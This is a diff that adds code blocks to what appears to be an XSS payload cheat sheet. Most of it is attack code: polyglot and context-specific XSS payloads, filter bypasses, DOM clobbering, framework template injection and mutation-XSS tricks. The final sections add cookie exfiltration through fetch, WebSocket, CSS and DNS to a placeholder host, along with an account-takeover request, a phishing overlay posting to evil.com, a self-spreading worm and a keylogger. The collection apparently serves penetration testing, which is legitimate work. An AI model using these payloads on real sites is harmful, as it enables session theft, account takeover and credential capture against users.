@@ -57,21 +57,58 @@ Payloads designed to fire across multiple injection contexts simultaneously.
 
 Fires in href, event handler, and JS string contexts.
 
+```javascript
+'">><img src=x onerror=alert(1)>
+```
+
 Closes HTML tag contexts, breaks out of title/style/textarea/noscript, injects SVG.
+
+```javascript
+</title><img src=x onerror=alert(1)>
+</textarea><img src=x onerror=alert(1)>
+</noscript><img src=x onerror=alert(1)>
+```
 
 Generic context-breaker for attribute injection.
 
+```javascript
+" onfocus=alert(1) autofocus="
+```
+
 Breaks out of any attribute-quoted context.
 
+```javascript
+' onmouseover=alert(1) '
+```
+
 Inside JS numeric or string arithmetic contexts.
+
+```javascript
+';alert(1);//
+"-alert(1)-"
+```
 
 ### Advanced Polyglots
 
 Multi-context payload using URL encoding and parser differential.
 
+```javascript
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
+```
+
 If injected inside a `<script>` block — breaks script context, triggers via SVG.
 
+```javascript
+</script><svg onload=alert(1)>
+```
+
 Template injection polyglot for Angular, Vue, Svelte template contexts.
+
+```javascript
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+v-html="<img src=x onerror=alert(1)>"
+```
 
 ---
 
@@ -80,6 +117,13 @@ Template injection polyglot for Angular, Vue, Svelte template contexts.
 ### HTML Body Context
 
 Injection directly into `<body>` content.
+
+```html
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+```
 
 
 **Filter Bypass:**
@@ -92,6 +136,12 @@ Injection directly into `<body>` content.
 
 Injection inside an HTML attribute value.
 
+```html
+" onfocus=alert(1) autofocus="
+' onmouseover=alert(1) '
+" onclick=alert(1) //
+```
+
 
 **Filter Bypass:**
 - Tab/newline between event handler and `=`: `" onfocus	=alert(1)`
@@ -101,6 +151,13 @@ Injection inside an HTML attribute value.
 ### JavaScript String Context
 
 Injection inside a JS string literal.
+
+```javascript
+';alert(1);//
+"-alert(1)-"
+`-alert(1)-`
+\'-alert(1)//
+```
 
 
 **Filter Bypass:**
@@ -113,6 +170,12 @@ Injection inside a JS string literal.
 
 Injection inside `href`, `src`, or `action` attributes.
 
+```html
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+ javascript:alert(1)
+```
+
 
 **Filter Bypass:**
 - Tab/newline after `javascript:`: `javascript%0a:alert(1)`
@@ -123,6 +186,12 @@ Injection inside `href`, `src`, or `action` attributes.
 ### Template Literal Context
 
 Injection inside ES6 template literals.
+
+```javascript
+`-alert(1)-`
+`${alert(1)}`
+`-`${alert(1)}`-`
+```
 
 
 ---
@@ -136,6 +205,13 @@ If `script-src` includes `unsafe-inline`, standard inline scripts execute. No by
 ### unsafe-eval Present
 
 If `unsafe-eval` is present:
+
+```javascript
+eval('alert(1)')
+setTimeout('alert(1)')
+setInterval('alert(1)')
+Function('alert(1)')()
+```
 
 ### Base URI Injection
 
@@ -188,22 +264,41 @@ Overwrite DOM properties to influence JavaScript execution.
 
 ### Basic Clobbering
 
+```html
+<a id=x><a id=x name=y>
+```
 If JS does `document.owner`, it returns the `<a>` element instead of `document`.
 
 ### Prototype Pollution Chain
 
+```html
+<input name=x constructor prototype=polluted>
+```
 Combined with code that reads `config[someKey]`, clobbered elements become truthy values.
 
 ### document.domain Override
 
+```html
+<a id=domain name=evil.com>
+```
 If JS reads `document.domain`, it gets the attacker-controlled value.
 
 ### Constructor Clobbering
 
+```html
+<a id=x name=constructor>
+```
 Or via named elements:
+
+```html
+<form><input name=constructor>
+```
 
 ### URL Parser Clobbering
 
+```html
+<a id=url href="https://evil.com">
+```
 If JS reads `element.href` or parses `document.getElementById('url').href`, it resolves to the attacker's domain.
 
 ---
@@ -230,6 +325,11 @@ If JS reads `element.href` or parses `document.getElementById('url').href`, it r
 
 **Template injection:**
 
+```html
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+```
+
 **Angular bypasses:**
 - `bypassSecurityTrustHtml()` — disables sanitizer for specific values
 - `[innerHTML]` binding with unsanitized input
@@ -237,6 +337,12 @@ If JS reads `element.href` or parses `document.getElementById('url').href`, it r
 - `routerLink` with attacker-controlled navigation targets
 
 **Angular-specific payloads:**
+
+```html
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{x = {'y':''.constructor.prototype}; x['y'].concat=[].join;$eval('x=alert(1)');}}
+<svg><script>alert&#40;1&#41;</script>
+```
 
 ### Vue
 
@@ -246,8 +352,18 @@ If JS reads `element.href` or parses `document.getElementById('url').href`, it r
 
 **Vue template injection:**
 
+```html
+{{constructor.constructor('alert(1)')()}}
+v-if="alert(1)"
+```
+
 **Vue event handler injection:**
 If user input is placed in Vue template directives.
+
+```html
+v-on:click=alert(1)
+@click=alert(1)
+```
 
 ### Svelte
 
@@ -259,6 +375,12 @@ If user input is placed in Vue template directives.
 **Svelte reactive statements:**
 If user input reaches reactive declarations.
 
+```svelte
+<script>
+$:eval('alert(1)')
+</script>
+```
+
 ---
 
 ## Mutation XSS (mXSS)
@@ -269,21 +391,44 @@ Exploits parser differentials between browser sanitizers and actual rendering.
 
 When `noscript` content is parsed by a sanitizer that treats it as raw text, but the browser renders it when JS is enabled.
 
+```html
+<noscript><img src=x onerror=alert(1)></noscript>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
+
 ### textarea/title Injection
 
 Sanitizers may not parse inside raw text elements, but browser mutation can break out.
+
+```html
+<textarea><img src=x onerror=alert(1)></textarea>
+<title><img src=x onerror=alert(1)></title>
+```
 
 ### DOMParser mXSS
 
 DOMParser may interpret content differently than the live DOM, enabling bypasses.
 
+```javascript
+var p = new DOMParser();
+var doc = p.parseFromString('<img src=x onerror=alert(1)>', 'text/html');
+```
+
 ### Template Element mXSS
 
 Content inside `<template>` is not rendered until the element is cloned and appended to the DOM.
 
+```html
+<template><img src=x onerror=alert(1)></template>
+```
+
 ### SVG ForeignObject
 
 SVG namespace parsing differs from HTML, bypassing some sanitizers.
+
+```html
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+```
 
 ---
 
@@ -291,6 +436,10 @@ SVG namespace parsing differs from HTML, bypassing some sanitizers.
 
 ### OOB Data Theft
 
+```javascript
+fetch('https://YOUR-OAST/?c='+document.cookie)
+new Image().src='https://YOUR-OAST/?c='+document.cookie
+```
 
 ### CSS Exfiltration
 
@@ -298,15 +447,31 @@ Brute-force character-by-character extraction of input values.
 
 **Modern CSS exfiltration:**
 
+```css
+input[value^="a"] { background-image: url(https://YOUR-OAST/?c=a); }
+input[value^="b"] { background-image: url(https://YOUR-OAST/?c=b); }
+```
+
 ### WebSocket Exfiltration
 
+```javascript
+var ws=new WebSocket('wss://YOUR-OAST/');
+ws.onopen=function(){ws.send(document.cookie)};
+```
 
 ### Fetch API Exfiltration
 
+```javascript
+fetch('/api/user-data').then(r=>r.json()).then(d=>{fetch('https://YOUR-OAST/?d='+JSON.stringify(d))})
+```
 
 ### DNS Exfiltration
 
 Data appears in DNS server logs. Useful when HTTP exfiltration is blocked.
+
+```javascript
+new Image().src='https://'+btoa(document.cookie).replace(/=/g,'')+'.YOUR-OAST/'
+```
 
 ---
 
@@ -314,19 +479,36 @@ Data appears in DNS server logs. Useful when HTTP exfiltration is blocked.
 
 ### Session Hijacking
 
+```javascript
+new Image().src='https://YOUR-OAST/?s='+document.cookie
+```
 Stolen session token allows attacker to impersonate the victim.
 
 ### Account Takeover
 
 Combine session theft with account modification for permanent takeover.
 
+```javascript
+fetch('/api/account/email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})
+```
+
 ### Phishing Overlay
 
+```javascript
+document.body.innerHTML='<form action=https://evil.com><input name=password type=password placeholder=Enter password></form>'
+```
 
 ### Worm Payload
 
+```javascript
+fetch('/api/post',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'<img src=x onerror=eval(atob("bmV3IEltYWdlKCkuc3JjPSdodHRwczovL1lPVVItT0FTVC8nPQ=="))>'})})
+```
 
 ### Keylogger
+
+```javascript
+document.onkeypress=function(e){new Image().src='https://YOUR-OAST/?k='+e.key}
+```
 
 
 ---
